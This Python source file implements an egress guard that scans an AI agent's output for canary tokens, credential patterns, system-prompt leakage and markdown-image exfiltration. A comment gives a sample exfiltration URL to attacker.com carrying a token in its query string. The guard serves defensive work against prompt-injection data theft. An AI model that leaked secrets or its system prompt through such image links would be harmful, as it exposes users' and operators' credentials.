"""Egress guard inspecting agent outputs for canary tokens, credentials, and prompt leakage (§6 G2)."""

from dataclasses import dataclass, field
import re
from typing import Literal, Optional

from aegis.models import AttackType, Finding

EgressAction = Literal["ALLOW", "SANITIZE", "BLOCK"]


@dataclass
class EgressVerdict:
    """Verdict returned by EgressGuard after scanning agent output (§6 G2)."""
    action: EgressAction
    text: str
    findings: list[Finding] = field(default_factory=list)
    reasons: list[str] = field(default_factory=list)
    blocked_canary: bool = False


class EgressGuard:
    """Runtime egress filter preventing exfiltration of secrets and canary tokens (§6 G2)."""

    CREDENTIAL_PATTERNS = [
        (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
        (r"sk-[A-Za-z0-9_-]{20,}", "API Secret Key"),
        (r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "JWT Bearer Token"),
        (r"password\s*=\s*['\"]?[^\s'\"]{6,}['\"]?", "Password Assignment"),
        (r"-----BEGIN [A-Z ]+ PRIVATE KEY-----", "Private Key Header"),
    ]

    def _compute_ngram_overlap(self, text: str, reference: str, n: int = 4) -> float:
        """Calculate n-gram Jaccard/overlap ratio between text and reference."""
        tokens_t = text.lower().split()
        tokens_r = reference.lower().split()

        if len(tokens_t) < n or len(tokens_r) < n:
            return 0.0

        ngrams_t = set(tuple(tokens_t[i : i + n]) for i in range(len(tokens_t) - n + 1))
        ngrams_r = set(tuple(tokens_r[i : i + n]) for i in range(len(tokens_r) - n + 1))

        if not ngrams_t:
            return 0.0

        shared = ngrams_t.intersection(ngrams_r)
        return len(shared) / len(ngrams_t)

    def scan_output(
        self,
        text: str,
        session_id: str,
        canary_token: str = "",
        system_prompt: str = "",
    ) -> EgressVerdict:
        """Scan generated agent response for egress violations."""
        reasons: list[str] = []
        findings: list[Finding] = []
        output_text = text
        action: EgressAction = "ALLOW"
        blocked_canary = False

        # 1. Canary Token Detection (Immediate Block)
        if canary_token and canary_token in text:
            blocked_canary = True
            action = "BLOCK"
            reasons.append("Canary token detected in egress output")
            findings.append(
                Finding(
                    attack_type=AttackType.SECRET_EXTRACTION,
                    score=1.0,
                    segment_id="egress",
                    evidence=f"Canary token '{canary_token[:12]}...' present in output",
                    detector="egress_canary",
                    layer="guard",
                )
            )

        # 2. Credential Pattern Redaction / Blocking
        for pat, desc in self.CREDENTIAL_PATTERNS:
            matches = list(re.finditer(pat, output_text, re.IGNORECASE))
            if matches:
                if action != "BLOCK":
                    action = "SANITIZE"
                reasons.append(f"{desc} detected in output")
                findings.append(
                    Finding(
                        attack_type=AttackType.CREDENTIAL_THEFT,
                        score=0.95,
                        segment_id="egress",
                        evidence=f"Credential match for {desc}",
                        detector="egress_credential_regex",
                        layer="guard",
                    )
                )
                # Redact credentials
                output_text = re.sub(pat, "[REDACTED:SECRET]", output_text, flags=re.IGNORECASE)

        # 3. System Prompt Verbatim Leakage
        if system_prompt:
            overlap = self._compute_ngram_overlap(text, system_prompt, n=4)
            if overlap >= 0.50:
                action = "BLOCK"
                reasons.append(f"System prompt verbatim leakage detected (overlap: {overlap*100:.1f}%)")
                findings.append(
                    Finding(
                        attack_type=AttackType.SECRET_EXTRACTION,
                        score=0.90,
                        segment_id="egress",
                        evidence=f"High system prompt overlap: {overlap:.2f}",
                        detector="egress_prompt_leakage",
                        layer="guard",
                    )
                )

        # 4. Markdown Exfiltration via Rendering Images
        # e.g. ![leak](http://attacker.com/collect?token=...)
        md_img_pat = r"!\[.*?\]\((https?://[^\s)]+)\)"
        for match in re.finditer(md_img_pat, text):
            url = match.group(1)
            if re.search(r"[?&](?:canary|token|key|secret|data)=", url, re.IGNORECASE):
                action = "BLOCK"
                reasons.append(f"Exfiltration attempt via markdown rendering: {url[:60]}")
                findings.append(
                    Finding(
                        attack_type=AttackType.SECRET_EXTRACTION,
                        score=0.95,
                        segment_id="egress",
                        evidence=f"Suspicious query param in markdown media URL",
                        detector="egress_markdown_exfil",
                        layer="guard",
                    )
                )

        if action == "BLOCK":
            output_text = "[SECURITY ALERT: Response blocked by AegisAgent Egress Guard]"

        return EgressVerdict(
            action=action,
            text=output_text,
            findings=findings,
            reasons=reasons,
            blocked_canary=blocked_canary,
        )


_EGRESS_GUARD = None


def get_egress_guard() -> EgressGuard:
    global _EGRESS_GUARD
    if _EGRESS_GUARD is None:
        _EGRESS_GUARD = EgressGuard()
    return _EGRESS_GUARD

